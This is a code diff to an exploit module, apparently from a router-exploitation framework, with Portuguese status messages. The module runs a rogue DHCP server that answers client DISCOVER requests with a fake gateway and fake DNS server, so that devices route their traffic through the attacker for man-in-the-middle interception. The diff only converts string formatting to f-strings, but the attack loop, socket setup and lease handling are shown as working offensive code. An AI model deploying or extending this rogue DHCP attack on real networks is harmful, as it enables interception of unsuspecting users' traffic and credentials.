@@ -136,8 +136,7 @@ class Exploit(Exploit):
         return (parts[0] << 24) | (parts[1] << 16) | (parts[2] << 8) | parts[3]
 
     def _int_to_ip(self, n):
-        return "{}.{}.{}.{}".format((n >> 24) & 0xFF, (n >> 16) & 0xFF,
-                                    (n >> 8) & 0xFF, n & 0xFF)
+        return f"{(n >> 24) & 0xFF}.{(n >> 16) & 0xFF}.{(n >> 8) & 0xFF}.{n & 0xFF}"
 
     @mute
     def check(self):
@@ -153,9 +152,8 @@ class Exploit(Exploit):
         router = str(self.router_ip) if self.router_ip else str(self.server_ip)
         dns = str(self.dns_ip)
 
-        print_warning("Iniciando servidor DHCP desonesto na porta {}".format(self.port))
-        print_warning("Server IP: {} | Gateway falso: {} | DNS falso: {}".format(
-            self.server_ip, router, dns))
+        print_warning(f"Iniciando servidor DHCP desonesto na porta {self.port}")
+        print_warning(f"Server IP: {self.server_ip} | Gateway falso: {router} | DNS falso: {dns}")
         print_warning("Dispositivos que receberem lease terão tráfego MitM!")
 
         try:
@@ -165,7 +163,7 @@ class Exploit(Exploit):
             sock.settimeout(1.0)
             sock.bind(("", int(self.port)))
         except OSError as exc:
-            print_error("Falha ao abrir socket DHCP (requer root): {}".format(exc))
+            print_error(f"Falha ao abrir socket DHCP (requer root): {exc}")
             return
 
         lease_counter = [0]
@@ -173,7 +171,7 @@ class Exploit(Exploit):
         stop_time = time.time() + int(self.duration)
         clients_served = []
 
-        print_status("Aguardando DHCP DISCOVER ({} segundos)...".format(self.duration))
+        print_status(f"Aguardando DHCP DISCOVER ({self.duration} segundos)...")
 
         while time.time() < stop_time:
             try:
@@ -191,9 +189,8 @@ class Exploit(Exploit):
                 next_ip_int += 1
                 lease_counter[0] += 1
 
-                print_success("DHCP DISCOVER de {} | XID: 0x{:08X}".format(addr[0], xid))
-                print_status("Enviando OFFER: IP={} | GW={} | DNS={}".format(
-                    offer_ip, router, dns))
+                print_success(f"DHCP DISCOVER de {addr[0]} | XID: 0x{xid:08X}")
+                print_status(f"Enviando OFFER: IP={offer_ip} | GW={router} | DNS={dns}")
 
                 offer_pkt = _build_dhcp_offer(
                     xid, offer_ip, str(self.server_ip), router, dns, int(self.lease_time))
@@ -201,15 +198,15 @@ class Exploit(Exploit):
                 clients_served.append({"client": addr[0], "offered_ip": offer_ip})
 
             elif msg_type == _DHCP_REQUEST:
-                print_info("DHCP REQUEST de {} | XID: 0x{:08X}".format(addr[0], xid))
+                print_info(f"DHCP REQUEST de {addr[0]} | XID: 0x{xid:08X}")
 
         sock.close()
 
         print_info("")
         print_success("Servidor DHCP desonesto encerrado")
-        print_info("Leases concedidos: {}".format(lease_counter[0]))
+        print_info(f"Leases concedidos: {lease_counter[0]}")
         if clients_served:
             headers = ["Cliente (IP solicitante)", "IP Oferecido"]
             rows = [(c["client"], c["offered_ip"]) for c in clients_served]
             print_table(headers, *rows)
-            print_warning("Os dispositivos acima devem estar roteando via {}".format(router))
+            print_warning(f"Os dispositivos acima devem estar roteando via {router}")
